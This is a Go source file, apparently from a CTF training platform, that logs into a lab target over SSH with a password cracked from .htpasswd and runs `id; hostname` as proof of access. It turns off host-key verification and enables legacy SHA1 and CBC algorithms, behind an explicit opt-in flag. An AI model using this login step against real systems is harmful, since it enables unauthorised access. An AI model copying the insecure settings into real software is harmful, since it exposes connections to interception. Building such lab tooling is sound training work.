package ctfplatform

// ssh_login.go —— 用破解出的口令验证 SSH 登录，作为"拿到 shell"的非 flag 证据。
//
// 靶场链条最后一跳：.htpasswd 破解 → SSH 登录 → 执行 `id` 证明权限。
// 与 flag 判分无关；不产生 WebFinding。
//
// 安全说明：靶机是自签主机密钥的旧系统，本函数默认**拒绝** insecure 模式，
// 必须显式传 allowInsecureHostKey=true 才会跳过主机密钥校验（仅限实验环境）。

import (
	"context"
	"fmt"
	"net"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

// SSHAccess 是一次成功的 SSH 登录结果。
type SSHAccess struct {
	User     string // 登录用户
	Addr     string // 目标地址
	WhoAmI   string // `id` 输出（证明权限）
	Hostname string // `hostname` 输出
}

// TrySSHLogin 尝试口令登录并执行 `id; hostname`。
// 失败返回 error（认证失败、算法不兼容、超时都会被区分说明）。
func TrySSHLogin(ctx context.Context, addr, user, password string,
	allowInsecureHostKey bool, timeout time.Duration) (*SSHAccess, error) {

	if !allowInsecureHostKey {
		return nil, fmt.Errorf("拒绝执行：靶机为自签主机密钥，必须显式允许 insecure 模式")
	}
	if timeout <= 0 {
		timeout = 10 * time.Second
	}

	cfg := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), // 实验靶场，显式声明
		Timeout:         timeout,
		// 2009 年的 OpenSSH 只支持老算法，需显式放开（现代默认已移除 sha1 系）
		Config: ssh.Config{
			KeyExchanges: []string{
				"curve25519-sha256", "ecdh-sha2-nistp256",
				"diffie-hellman-group14-sha1", "diffie-hellman-group-exchange-sha1",
				"diffie-hellman-group1-sha1",
			},
			Ciphers: []string{
				"aes128-ctr", "aes256-ctr", "aes128-cbc", "3des-cbc",
			},
		},
		HostKeyAlgorithms: []string{"ssh-rsa", "rsa-sha2-256", "ssh-ed25519"},
	}

	d := net.Dialer{Timeout: timeout}
	conn, err := d.DialContext(ctx, "tcp", addr)
	if err != nil {
		return nil, fmt.Errorf("连接 %s 失败: %w", addr, err)
	}
	c, chans, reqs, err := ssh.NewClientConn(conn, addr, cfg)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("SSH 握手/认证失败: %w", err)
	}
	client := ssh.NewClient(c, chans, reqs)
	defer client.Close()

	sess, err := client.NewSession()
	if err != nil {
		return nil, fmt.Errorf("创建会话失败: %w", err)
	}
	defer sess.Close()

	out, err := sess.CombinedOutput("id; hostname")
	if err != nil {
		return nil, fmt.Errorf("执行命令失败: %w", err)
	}

	lines := strings.Split(strings.TrimSpace(string(out)), "\n")
	res := &SSHAccess{User: user, Addr: addr}
	if len(lines) > 0 {
		res.WhoAmI = strings.TrimSpace(lines[0])
	}
	if len(lines) > 1 {
		res.Hostname = strings.TrimSpace(lines[1])
	}
	return res, nil
}
